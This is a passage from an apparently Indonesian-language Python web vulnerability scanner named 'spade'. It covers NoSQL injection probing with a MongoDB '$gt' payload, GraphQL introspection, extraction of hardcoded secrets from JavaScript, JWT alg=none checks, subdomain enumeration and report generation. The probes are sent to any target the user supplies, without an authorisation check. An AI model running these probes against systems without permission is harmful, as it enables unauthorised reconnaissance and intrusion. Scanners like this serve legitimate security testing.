    if is_echo_endpoint(sess, base_url):
        info("  (dilewati: endpoint memantulkan input)")
        return f
    for param in ["id","user","username","email","token"]:
        try:
            r1 = sess.get(base_url, params={param: '{"$gt":""}'}, timeout=10)
            r2 = sess.get(base_url, params={param: "test"}, timeout=10)
            if r1.status_code==200 and abs(len(r1.content)-len(r2.content)) > 500:
                warn(f"Kemungkinan NoSQL injection di parameter '{param}'")
                f.append(("MEDIUM","NOSQLI",f"Parameter '{param}' menunjukkan respons berbeda saat dikirim nilai JSON operator MongoDB ($gt). Attacker bisa bypass autentikasi atau membaca data tanpa izin."))
                break
        except: pass
    return f

def scan_graphql(sess, base_url, ctx=None):
    f = []; info("Memeriksa GraphQL...")
    # Introspection query mentah (tanpa double-encode)
    q_raw = "{__schema{types{name fields{name}}}}"
    paths = ["/graphql","/api/graphql","/gql","/graphiql","/v1/graphql","/query"]
    for path in paths:
        url = join(base_url,path)
        # GET — param query lgsg
        try:
            r = sess.get(url, params={"query": q_raw}, timeout=10)
            if r.status_code in (200,201):
                try:
                    j = r.json()
                    if isinstance(j.get("data"), dict) and "__schema" in j["data"]:
                        critical(f"GraphQL introspection aktif (GET): {url}")
                        f.append(("HIGH","GRAPHQL_INTROSPECTION",f"GraphQL endpoint di {url} mengizinkan introspection query via GET. Siapa pun bisa mendapatkan skema lengkap API — termasuk semua tipe, query, mutasi, dan field. Ini membocorkan seluruh permukaan API."))
                        return f
                except: pass
        except: pass
        # POST — kirim JSON langsung (jangan pake json.dumps lagi biar requests yg encode)
        try:
            r = sess.post(url, json={"query": q_raw}, timeout=10)
            if r.status_code in (200,201):
                try:
                    j = r.json()
                    if isinstance(j.get("data"), dict) and "__schema" in j["data"]:
                        critical(f"GraphQL introspection aktif (POST): {url}")
                        f.append(("HIGH","GRAPHQL_INTROSPECTION",f"GraphQL endpoint di {url} mengizinkan introspection query via POST. Siapa pun bisa mendapatkan skema lengkap API — termasuk semua tipe, query, mutasi, dan field. Ini membocorkan seluruh permukaan API."))
                        return f
                except: pass
        except: pass
    return f

def scan_js(sess, base_url, ctx=None):
    f = []; info("Menganalisis JavaScript...")
    try:
        r = sess.get(base_url, timeout=10)
        js_urls = set()
        for m in re.finditer(r'<script[^>]*src=["\']([^"\']+\.js[^"\']*)["\']', r.text, re.I):
            js_urls.add(urllib.parse.urljoin(base_url, m.group(1)))
        if not js_urls: info("Tidak ada file JS"); return f
        info(f"Ditemukan {len(js_urls)} file JS")
        for js_url in list(js_urls)[:5]:
            try:
                r2 = sess.get(js_url, timeout=10)
                if r2.status_code!=200: continue
                t = r2.text
                fn = js_url.split('/')[-1]
                # API endpoints
                apis = re.findall(r'["\'](/[a-zA-Z0-9_\-./?&=]+)["\']', t)
                apis = [x for x in set(apis) if re.search(r'/api/|/v1/|/v2/|graphql|rest', x, re.I)]
                apis = [x for x in apis if not any(s in x.lower() for s in ["jquery","react","vue","angular","bootstrap","fontawesome"])]
                if apis:
                    info(f"  {fn}: {len(apis)} endpoint API")
                    f.append(("INFO","JS_APIS",f"File {fn} mengandung {len(apis)} endpoint API. Endpoint ini mungkin tidak terdokumentasi: {', '.join(apis[:5])}"))
                # Hardcoded secrets
                secrets = re.findall(r'(?:api[_-]?key|secret|password|token|auth)\s*[:=]\s*["\'](?!([A-Z][a-z]+\s))([a-zA-Z0-9_\-/@#$%^&*+=]{16,})["\']', t, re.I)
                secrets = [s for s,_ in secrets]
                real = []
                for s in secrets:
                    sl = s.lower()
                    if any(kw in sl for kw in ["unexpected","duplicate","undefined","prototype","function","callback","return","default","configure","property","attribute"]): continue
                    if re.search(r'[0-9]', s) or re.search(r'[A-Z]', s): real.append(s)
                for s in real[:5]:
                    critical(f"Kredensial hardcode di {fn}")
                    f.append(("CRITICAL","JS_SECRET",f"File JS {fn} mengandung kredensial/secret hardcode: '{s[:20]}...'. Jika ini adalah kredensial produksi, attacker bisa langsung mengakses resource yang dilindungi."))
            except: pass
    except: pass
    return f

def scan_jwt(sess, base_url, ctx=None):
    f = []; info("Menganalisis JWT...")
    try:
        r = sess.get(base_url, timeout=10)
        for ck, cv in sess.cookies.items():
            if cv.count(".")==2:
                try:
                    import base64 as b64
                    def b64d(s): s=s+"="*(4-len(s)%4); return json.loads(b64.b64decode(s.replace("-","+").replace("_","/")).decode())
                    h = b64d(cv.split(".")[0])
                    if isinstance(h, dict):
                        if h.get("alg")=="none":
                            critical(f"JWT di cookie '{ck}' menggunakan alg=none")
                            f.append(("CRITICAL","JWT_ALG_NONE",f"JWT di cookie '{ck}' menggunakan algoritma 'none'. Attacker bisa memalsukan token dengan payload apa pun tanpa tanda tangan dan mendapatkan akses tidak sah."))
                        else:
                            info(f"JWT di cookie '{ck}', alg={h.get('alg')}")
                            f.append(("INFO","JWT_COOKIE",f"Cookie '{ck}' berisi JWT (alg={h.get('alg')}). Token perlu dievaluasi manual untuk validasi signature, expiry, dan klaim."))
                except: pass
        auth = r.request.headers.get("Authorization","")
        if auth.startswith("Bearer "):
            t = auth[7:]
            if t.count(".")==2: f.append(("INFO","JWT_BEARER","Authorization header menggunakan Bearer token JWT. Periksa validitas token secara manual."))
    except: pass
    return f

def scan_subdomains(sess, base_url, ctx=None):
    f = []; info("Mencari subdomain...")
    host = host_from_url(base_url)
    host = re.sub(r'^www\.', '', host)
    if not re.match(r'^[a-zA-Z0-9\-.]+\.[a-zA-Z]{2,}$', host): return f
    subs = set()
    try:
        r = sess.get(f"https://crt.sh/?q=%25.{host}&output=json", timeout=15)
        if r.status_code==200:
            try:
                data = r.json()
                if isinstance(data, list):
                    for entry in data[:50]:
                        for s in entry.get("name_value","").split("\n"):
                            s=s.strip()
                            if s.endswith(f".{host}") or s==host: subs.add(s)
            except: pass
    except: pass
    common = ["www","mail","admin","api","dev","staging","test","beta","app","blog","cdn","static","docs","wiki","help","support","status","portal","shop"]
    for sub in common:
        fqdn = f"{sub}.{host}"
        if fqdn in subs: continue
        try:
            socket.getaddrinfo(fqdn, 443, socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, socket.AI_NUMERICSERV)
            subs.add(fqdn)
        except: pass
    if subs:
        info(f"Ditemukan {len(subs)} subdomain")
        for s in sorted(subs)[:10]: info(f"  {s}")
        if len(subs)>10: info(f"  +{len(subs)-10} lainnya")
        f.append(("INFO","SUBDOMAINS",f"Ditemukan {len(subs)} subdomain untuk {host} via CRT.sh + DNS lookup. Periksa setiap subdomain untuk potensi serangan: {'; '.join(sorted(subs)[:10])}"))
    return f

def scan_forms_analyze(sess, base_url, ctx=None):
    f = []; info("Menganalisis form...")
    crawler = ctx.get("crawler") if ctx else None
    if not crawler: return f
    forms = crawler.get_forms()
    if forms:
        seen = set()
        info(f"Ditemukan {len(forms)} form")
        for action,method,inputs,page in forms:
            names = [i["name"] for i in inputs if i["name"]]
            key = (action,method)
            if key in seen: continue
            seen.add(key)
            info(f"  {method} {action}: {names}")
            if any("pass" in n.lower() for n in names):
                if not action.startswith("https") and base_url.startswith("https"):
                    warn(f"Form password dikirim lewat HTTP: {action}")
                    f.append(("MEDIUM","FORM_HTTP",f"Form dengan field password di {page} mengirim data ke {action} (HTTP, bukan HTTPS). Password dikirim dalam teks mentah — bisa dicegat attacker di jaringan yang sama (WiFi publik, dll)."))
    else: info("Tidak ada form")
    return f

def waf_detect(sess, base_url):
    sigs = {"Cloudflare":[("server","cloudflare"),("cf-ray","")],
            "AWS WAF":[("x-amz-cf-id",""),("server","cloudfront")],
            "ModSecurity":[("server","mod_security")],
            "Akamai":[("server","akamaighost")],
            "Imperva":[("x-iinfo","")]}
    detected = []
    try:
        r = sess.get(base_url, timeout=10)
        h = {k.lower():v.lower() for k,v in r.headers.items()}
        for name, sigs_list in sigs.items():
            if all(h.get(hdr,"") and (not val or val in h[hdr]) for hdr,val in sigs_list): detected.append(name)
        if "attention required" in r.text.lower() and "cloudflare" in r.text.lower(): detected.append("Cloudflare")
    except: pass
    return detected

# ── report ──
SEV_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}

def gen_html(finds, target, start, end, out):
    def sk(f): return (SEV_ORDER.get(f[0],99), f[2] if len(f)>2 else "")
    sf = sorted(finds, key=sk)
    rows = ""
    for fi in sf:
        sev = fi[0].lower()
        rows += f"""<tr class="{sev}"><td><span class="sev-badge {sev}">{fi[0]}</span></td><td>{htmlmod.escape(fi[1]) if len(fi)>1 else ""}</td><td>{htmlmod.escape(fi[2]) if len(fi)>2 else ""}</td></tr>\n"""
    sc = defaultdict(int)
    for fi in sf: sc[fi[0]]+=1
    summary = "".join(f'<div class="sev-count {s.lower()}"><strong>{s}:</strong> {c}</div>' for s,c in sorted(sc.items(), key=lambda x: SEV_ORDER.get(x[0],99)))
    dur = (end-start).total_seconds()
    html = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Spade Scan - {htmlmod.escape(target)}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}}
.container{{max-width:1200px;margin:0 auto}}
h1{{font-size:1.6rem;margin-bottom:4px}}
.subtitle{{color:#8b949e;margin-bottom:24px}}
.summary{{display:flex;gap:20px;flex-wrap:wrap;margin-bottom:24px}}
.card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px 20px;flex:1;min-width:150px}}
.card h3{{font-size:.85rem;color:#8b949e;text-transform:uppercase}}
.card .val{{font-size:1.8rem;font-weight:700;margin-top:4px}}
.sev-count{{display:inline-block;margin-right:12px;margin-bottom:6px;padding:4px 10px;border-radius:12px;font-size:.85rem}}
table{{width:100%;border-collapse:collapse;background:#161b22;border-radius:8px;overflow:hidden}}
th{{background:#21262d;padding:10px 14px;text-align:left;font-size:.8rem;text-transform:uppercase;color:#8b949e}}
td{{padding:10px 14px;border-top:1px solid #21262d;font-size:.9rem}}
.sev-badge{{display:inline-block;padding:2px 8px;border-radius:10px;font-weight:600;font-size:.75rem}}
.critical .sev-badge{{background:#d73a4a;color:#fff}}
tr.high{{border-left:3px solid #d73a4a}}
.high .sev-badge{{background:#d73a4a;color:#fff}}
tr.medium{{border-left:3px solid #d29922}}
.medium .sev-badge{{background:#d29922;color:#0d1117}}
tr.low{{border-left:3px solid #58a6ff}}
.low .sev-badge{{background:#58a6ff;color:#0d1117}}
tr.info{{border-left:3px solid #8b949e}}
.info .sev-badge{{background:#8b949e;color:#0d1117}}
.footer{{margin-top:32px;text-align:center;color:#484f58;font-size:.8rem}}
</style></head><body><div class="container">
<h1>Spade Scan Report</h1>
<p class="subtitle">{htmlmod.escape(target)} &mdash; {end.strftime('%Y-%m-%d %H:%M:%S')}</p>
<div class="summary"><div class="card"><h3>Duration</h3><div class="val">{dur:.1f}s</div></div><div class="card"><h3>Findings</h3><div class="val">{len(sf)}</div></div><div class="card"><h3>Severity</h3><div style="margin-top:8px">{summary}</div></div></div>
<table><thead><tr><th style="width:90px">Severity</th><th style="width:200px">Category</th><th>Detail</th></tr></thead><tbody>{rows}</tbody></table>
<div class="footer">spade &mdash; {end.strftime('%Y-%m-%d %H:%M:%S')}</div>
</div></body></html>"""
    with open(out,"w",encoding="utf-8") as f: f.write(html)
    return out

def gen_csv(finds, target, out):
    with open(out,"w",newline="",encoding="utf-8") as f:
        w = csv.writer(f); w.writerow(["Severity","Category","Detail","Target"])
        for fi in finds:
            w.writerow([fi[0], fi[1] if len(fi)>1 else "", fi[2] if len(fi)>2 else "", target])

# ══════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════

def main():
    global DISABLE_COLOR
    parser = argparse.ArgumentParser(
        description="spade — Automated Web Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Contoh:
  python3 spade.py example.com                      # standard (default)
  python3 spade.py example.com --quick               # quick check
  python3 spade.py example.com --detailed            # full scan
  python3 spade.py example.com -o laporan.html       # custom output
  python3 spade.py example.com --csv hasil.csv       # export CSV""")
    parser.add_argument("target", nargs="?", default="", help="Target URL (opsional — akan diminta interaktif jika kosong)")
    parser.add_argument("-o","--output", default="", help="Laporan HTML")
    parser.add_argument("--csv", default="", help="Export CSV")
    parser.add_argument("--quick", action="store_true", help="Mode cepat (7 modul, basic checks)")
    parser.add_argument("--detailed", action="store_true", help="Mode lengkap (23 modul, crawl)")
    parser.add_argument("--no-color", action="store_true", help="Output tanpa warna")
    args = parser.parse_args()
    if args.no_color: DISABLE_COLOR = True

    # ── Interactive prompt jika target tidak diberikan ──
    if not args.target:
        print()
        print(f"    {c('bold',c('cyan','+===========[ SPADE ]===========+'))}")
        print(f"    {c('bold',c('cyan','|'))}  {c('bold','Web Vuln Scanner')}     {c('bold',c('cyan','|'))}")
        print(f"    {c('bold',c('cyan','+==============================+'))}")
        inp = input("\n  [>] Masukkan domain/URL target: ").strip()
        while not inp:
            inp = input("  [>] Target tidak boleh kosong: ").strip()
        args.target = inp
        print()
        print("  Pilih mode scan:")
        print("    [1] Quick     — 7 modul, basic checks (cepat)")
        print("    [2] Standard  — 16 modul, recommended (default)")
        print("    [3] Detailed  — 23 modul, full scan dengan crawl + subdomain")
        mode_ch = input("  [>] Pilih [1/2/3] (default: 2): ").strip()
        while mode_ch and mode_ch not in ("1","2","3"):
            mode_ch = input("  [>] Pilih 1, 2, atau 3: ").strip()
        if mode_ch == "1":
            args.quick = True
        elif mode_ch == "3":
            args.detailed = True
        # else default (standard)
        print()


    target = normalize_url(args.target)
    host = host_from_url(target)
    mode = "quick" if args.quick else ("detailed" if args.detailed else "standard")

    print()
    print(f"    {c('bold',c('cyan','+===========[ SPADE ]===========+'))}")
    print(f"    {c('bold',c('cyan','|'))}  {c('bold','Web Vuln Scanner')}     {c('bold',c('cyan','|'))}")
    print(f"    {c('bold',c('cyan','|'))}  mode: {c('bold',mode.upper())}{' '*(13-len(mode))}  {c('bold',c('cyan','|'))}")
    print(f"    {c('bold',c('cyan','+==============================+'))}")
    print()
    info(f"Target: {c('bold',target)}")
    info(f"Mode  : {mode.upper()}")
    info(f"Start : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()

    sess = make_session(timeout=15)
    finds = []
    start = datetime.now()

    wafs = waf_detect(sess, target)
    if wafs: info(f"WAF terdeteksi: {', '.join(wafs)}")

    ALL_MODULES = OrderedDict([
        ("tech",      ("Teknologi", tech_finger)),
        ("headers",   ("Security Headers", sec_headers)),
        ("robots",    ("robots.txt", robots_txt)),
        ("sensitive", ("File Sensitif", sensitive_files)),
        ("dirlist",   ("Directory Listing", dir_listing)),
        ("methods",   ("HTTP Methods", http_methods)),
        ("cors",      ("CORS", cors_check)),
        ("tls",       ("TLS/SSL", tls_ssl)),
        ("forms",     ("Analisis Form", scan_forms_analyze)),
        ("sqli",      ("SQL Injection", scan_sqli)),
        ("xss",       ("XSS", scan_xss)),
        ("openr",     ("Open Redirect", open_redirect)),
        ("lfi",       ("LFI", lfi_check)),
        ("cmdi",      ("Command Injection", cmd_injection)),
        ("ssrf",      ("SSRF", ssrf_check)),
        ("ratelimit", ("Rate Limit", rate_limit)),
        ("xxe",       ("XXE", scan_xxe)),
        ("ssti",      ("SSTI", scan_ssti)),
        ("nosqli",    ("NoSQL Injection", scan_nosqli)),
        ("graphql",   ("GraphQL", scan_graphql)),
        ("js",        ("JS Analysis", scan_js)),
        ("jwt",       ("JWT", scan_jwt)),
        ("subdomains",("Subdomain", scan_subdomains)),
    ])
    DETAILED_ONLY = {"xxe","ssti","nosqli","graphql","js","jwt","subdomains"}

    if mode == "quick":
        modules = ["tech","headers","robots","sensitive","cors","tls","ratelimit"]
        crawler = None
    elif mode == "detailed":
        modules = list(ALL_MODULES.keys())
        info("Merayapi halaman (depth 2)...")
        crawler = Crawler(sess, target, depth=2, max_p=30)
        crawler.crawl()
        info(f"Merayapi {len(crawler.pages)} halaman")
        print()
    else:
        modules = [k for k in ALL_MODULES.keys() if k not in DETAILED_ONLY]
        crawler = None
    ctx = {"crawler": crawler}

    info(f"Menjalankan {len(modules)} modul...")
    for key in modules:
        name, func = ALL_MODULES[key]
        print(f"\n  {c('bold',c('magenta','---'))} {c('bold',name)}")
        try:
            res = func(sess, target, ctx)
            if res: finds.extend(res)
        except: pass

    end = datetime.now()
    dur = (end-start).total_seconds()
    print(f"\n  {c('bold',c('magenta','+==============================+'))}")
    print()
    info(f"Selesai dalam {dur:.1f}s")
    info(f"Total temuan: {len(finds)}")
    for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
        n = sum(1 for f in finds if f[0]==sev)
        if n>0: ic = {"CRITICAL":"bg_red","HIGH":"red","MEDIUM":"yellow","LOW":"blue","INFO":"dim"}; print(f"    {c(ic.get(sev,''),f'{sev}: {n}')}")
    print()

    outpath = args.output or f"spade_{host}.html"
    gen_html(finds, target, start, end, outpath)
    good(f"Laporan: {outpath}")
    if args.csv:
        gen_csv(finds, target, args.csv)
        good(f"CSV   : {args.csv}")
    print()

if __name__ == "__main__":
    main()
